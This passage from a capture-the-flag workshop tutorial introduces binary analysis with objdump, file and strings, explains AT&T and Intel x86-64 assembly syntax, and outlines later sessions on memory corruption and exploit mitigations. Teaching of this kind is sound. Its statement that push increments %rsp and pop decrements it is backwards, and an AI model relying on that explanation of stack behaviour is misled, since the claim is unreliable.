  40045b:       e9 c0 ff ff ff          jmpq   400420 <_init+0x20>

Disassembly of section .plt.got:

0000000000400460 <.plt.got>:
  400460:       ff 25 92 0b 20 00       jmpq   *0x200b92(%rip)        # 600ff8 <_DYNAMIC+0x1d0>
  400466:       66 90                   xchg   %ax,%ax

Disassembly of section .text:

0000000000400470 <_start>:
  400470:       31 ed                   xor    %ebp,%ebp
  400472:       49 89 d1                mov    %rdx,%r9
  400475:       5e                      pop    %rsi
  400476:       48 89 e2                mov    %rsp,%rdx
  400479:       48 83 e4 f0             and    $0xfffffffffffffff0,%rsp
  40047d:       50                      push   %rax
  40047e:       54                      push   %rsp
  40047f:       49 c7 c0 70 06 40 00    mov    $0x400670,%r8
  400486:       48 c7 c1 00 06 40 00    mov    $0x400600,%rcx
  40048d:       48 c7 c7 66 05 40 00    mov    $0x400566,%rdi
  400494:       e8 a7 ff ff ff          callq  400440 <__libc_start_main@plt>
  400499:       f4                      hlt
  40049a:       66 0f 1f 44 00 00       nopw   0x0(%rax,%rax,1)

... application boilerplate snipped away ...

0000000000400566 <main>:
  400566:       55                      push   %rbp
  400567:       48 89 e5                mov    %rsp,%rbp
  40056a:       48 83 ec 10             sub    $0x10,%rsp
  40056e:       89 7d fc                mov    %edi,-0x4(%rbp)
  400571:       48 89 75 f0             mov    %rsi,-0x10(%rbp)
  400575:       48 8b 45 f0             mov    -0x10(%rbp),%rax
  400579:       48 83 c0 08             add    $0x8,%rax
  40057d:       48 8b 00                mov    (%rax),%rax
  400580:       48 89 c7                mov    %rax,%rdi
  400583:       b8 00 00 00 00          mov    $0x0,%eax
  400588:       e8 a3 fe ff ff          callq  400430 <printf@plt>
  40058d:       b8 00 00 00 00          mov    $0x0,%eax
  400592:       e8 07 00 00 00          callq  40059e <say_hello>
  400597:       b8 00 00 00 00          mov    $0x0,%eax
  40059c:       c9                      leaveq
  40059d:       c3                      retq

000000000040059e <say_hello>:
  40059e:       55                      push   %rbp
  40059f:       48 89 e5                mov    %rsp,%rbp
  4005a2:       48 83 ec 10             sub    $0x10,%rsp
  4005a6:       48 c7 45 f0 84 06 40    movq   $0x400684,-0x10(%rbp)
  4005ad:       00
  4005ae:       48 c7 45 f8 8d 06 40    movq   $0x40068d,-0x8(%rbp)
  4005b5:       00
  4005b6:       48 8b 55 f8             mov    -0x8(%rbp),%rdx
  4005ba:       48 8b 45 f0             mov    -0x10(%rbp),%rax
  4005be:       48 89 d6                mov    %rdx,%rsi
  4005c1:       48 89 c7                mov    %rax,%rdi
  4005c4:       e8 87 fe ff ff          callq  400450 <strcmp@plt>
  4005c9:       85 c0                   test   %eax,%eax
  4005cb:       75 11                   jne    4005de <say_hello+0x40>
  4005cd:       48 8b 45 f0             mov    -0x10(%rbp),%rax
  4005d1:       48 89 c7                mov    %rax,%rdi
  4005d4:       b8 00 00 00 00          mov    $0x0,%eax
  4005d9:       e8 52 fe ff ff          callq  400430 <printf@plt>
  4005de:       48 8b 45 f8             mov    -0x8(%rbp),%rax
  4005e2:       48 89 c7                mov    %rax,%rdi
  4005e5:       b8 00 00 00 00          mov    $0x0,%eax
  4005ea:       e8 41 fe ff ff          callq  400430 <printf@plt>
  4005ef:       90                      nop
  4005f0:       c9                      leaveq
  4005f1:       c3                      retq
  4005f2:       66 2e 0f 1f 84 00 00    nopw   %cs:0x0(%rax,%rax,1)
  4005f9:       00 00 00
  4005fc:       0f 1f 40 00             nopl   0x0(%rax)

... application boilerplate snipped away ...
elliot@ctf101-shell:~/ctf101$
```

#### file

Amazing tool to guess a file's filetype.

```console
elliot@ctf101-shell:~/ctf101$ file demotools
demotools: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically
linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32,
BuildID[sha1]=ae2e06fe46509a8713c6e51b38649910afc993e9, not stripped
elliot@ctf101-shell:~/ctf101$
```

#### strings

Another basic tool that you should always use to get a better idea of what you
are looking at. Don't run it vanilla on [untrusted binaries
though](http://lcamtuf.blogspot.sg/2014/10/psa-dont-run-strings-on-untrusted-files.html).

```console
elliot@ctf101-shell:~/ctf101$ strings demotools
/lib64/ld-linux-x86-64.so.2
libc.so.6
printf
strcmp
__libc_start_main
__gmon_start__
GLIBC_2.2.5
UH-@
AWAVA
AUATL
[]A\A]A^A_
Goaway!
Helloo!
;*3$"
GCC: (Ubuntu 5.4.0-6ubuntu1~16.04.2) 5.4.0 20160609
crtstuff.c
__JCR_LIST__
deregister_tm_clones
__do_global_dtors_aux
completed.7585
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
demotools.c
__FRAME_END__
__JCR_END__
__init_array_end
_DYNAMIC
__init_array_start
__GNU_EH_FRAME_HDR
_GLOBAL_OFFSET_TABLE_
__libc_csu_fini
_ITM_deregisterTMCloneTable
_edata
printf@@GLIBC_2.2.5
__libc_start_main@@GLIBC_2.2.5
__data_start
strcmp@@GLIBC_2.2.5
__gmon_start__
__dso_handle
_IO_stdin_used
__libc_csu_init
__bss_start
main
say_hello
_Jv_RegisterClasses
__TMC_END__
_ITM_registerTMCloneTable
.symtab
.strtab
.shstrtab
.interp
.note.ABI-tag
.note.gnu.build-id
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rela.dyn
.rela.plt
.init
.plt.got
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.jcr
.dynamic
.got.plt
.data
.bss
.comment
elliot@ctf101-shell:~/ctf101$
```

### Reading x86-64 assembly

Now, obviously, assembly, especially x86-64 assembly is not something you can
get used to in an hour. So we'll just cover superficially what you need to be
able to read for this session.

Consider this fragment:

```console
000000000040057d <main>:
  40057d:       55                      push   %rbp
  40057e:       48 89 e5                mov    %rsp,%rbp
  400581:       48 83 ec 10             sub    $0x10,%rsp
  400585:       89 7d fc                mov    %edi,-0x4(%rbp)
  400588:       48 89 75 f0             mov    %rsi,-0x10(%rbp)
  40058c:       48 8b 45 f0             mov    -0x10(%rbp),%rax
  400590:       48 83 c0 08             add    $0x8,%rax
  400594:       48 8b 00                mov    (%rax),%rax
  400597:       48 89 c7                mov    %rax,%rdi
  40059a:       b8 00 00 00 00          mov    $0x0,%eax
  40059f:       e8 ac fe ff ff          callq  400450 <printf@plt>
  4005a4:       b8 00 00 00 00          mov    $0x0,%eax
  4005a9:       e8 02 00 00 00          callq  4005b0 <say_hello>
  4005ae:       c9                      leaveq
  4005af:       c3                      retq
```

This is in AT&T or GAS syntax which means that most instructions take the form

```
mnenomic source, destination
```

Also, mnenomics tend to have operation suffixes based on the size of the operand
that is being manipulated.

There are sigils involved as well, registers are prefixed with % and constant
numbers are prefixed with $.

Now, contrast the above with something in Intel syntax:

```console
Dump of assembler code for function main:
   0x000000000040057d <+0>:     push   rbp
   0x000000000040057e <+1>:     mov    rbp,rsp
   0x0000000000400581 <+4>:     sub    rsp,0x10
   0x0000000000400585 <+8>:     mov    DWORD PTR [rbp-0x4],edi
   0x0000000000400588 <+11>:    mov    QWORD PTR [rbp-0x10],rsi
   0x000000000040058c <+15>:    mov    rax,QWORD PTR [rbp-0x10]
   0x0000000000400590 <+19>:    add    rax,0x8
   0x0000000000400594 <+23>:    mov    rax,QWORD PTR [rax]
   0x0000000000400597 <+26>:    mov    rdi,rax
   0x000000000040059a <+29>:    mov    eax,0x0
   0x000000000040059f <+34>:    call   0x400450 <printf@plt>
   0x00000000004005a4 <+39>:    mov    eax,0x0
   0x00000000004005a9 <+44>:    call   0x4005b0 <say_hello>
   0x00000000004005ae <+49>:    leave
   0x00000000004005af <+50>:    ret
```

Now, the order of the source and destination operands is flipped compared to
AT&T syntax. Also, square brackets.

Important operations to know are:

```console
40057d: 55                      push   %rbp
40066a: 5b                      pop    %rbx
```

Push operations manipulate data on the stack. The stack frame is usually
handled through storing addresses in the %rbp and %rsp registers. Every time a
push happens, the data is pushed into the addressed at %rsp and %rsp is
incremented (the size depends on the architecture). Pop operations are the
reverse. Data from memory is put into a register and the %rsp is decremented.

```console
400588: 48 89 75 f0             mov    %rsi,-0x10(%rbp)
```

Move operations are fairly common. They generally move data from register to
register, register to memory, or memory to register. Offsets from the addresses
stored in registers are also allowed.

```console
400581: 48 83 ec 10             sub    $0x10,%rsp
40042d: 48 83 c4 08             add    $0x8,%rsp
400634: 31 db                   xor    %ebx,%ebx
400499: 48 83 e4 f0             and    $0xfffffffffffffff0,%rsp
```

Arithmetic operations are also fairly common.

```console
4005fc: e8 4f fe ff ff          callq  400450 <printf@plt>
4005ae: c9                      leaveq
4005af: c3                      retq
```

These instructions are the main ways a program handles function calls and
returning from those function calls.

```console
400530: 80 3d 11 0b 20 00 00    cmpb   $0x0,0x200b11(%rip)
400537: 75 11                   jne    40054a <__do_global_dtors_aux+0x1a>
```

Branching instructions are also very important as they determine which path the
program execution takes. These work because comparison (and some arithmetic)
instructions set certain flags in the processor. These flags are used to check
whether to take a jump or not.

```console
400527: ff e2                   jmpq   *%rdx
```

Of course, there are also non-conditional branching instructions.

### Baby Simple Exercise

Without referring to the source code, can you figure out how to get the
`babysimple` (binary)[./lessonfiles/assembly/3-babysimple] to print "Correct!"?
Resist the urge to peek below for the answer and take a couple of moments to try
and reverse engineer from the assembly.



## 7. Memory Layout

- Stack and Heap
- Variables - stack variables, dynamically allocated variables and static
  variables

## 8. Stack Frames

- Saved RIP
- Saved EBP

## 9. Debuggers

- GDB
- Inputs
- Breakpoints
- Examining and modifying context
- Crash Analysis

## 10. Memory Corruption Vulnerabilities


## 11. Mitigations and Bypasses

- Stack Canaries
- ASLR
- NX

## 13. Conclusion and Additional Challenges

This section brings the workshop to an end. We hope it was adequate in giving
you an introduction to the topics we covered and have sparked an interest in
vulnerability analysis and exploit writing. Stay tuned for workshops that cover
more advanced topics.

If time permits, please do try the following challenges out to test your
understanding of what we covered today and maybe explore a bit more on your own.

### Challenge 1

### Challenge 2

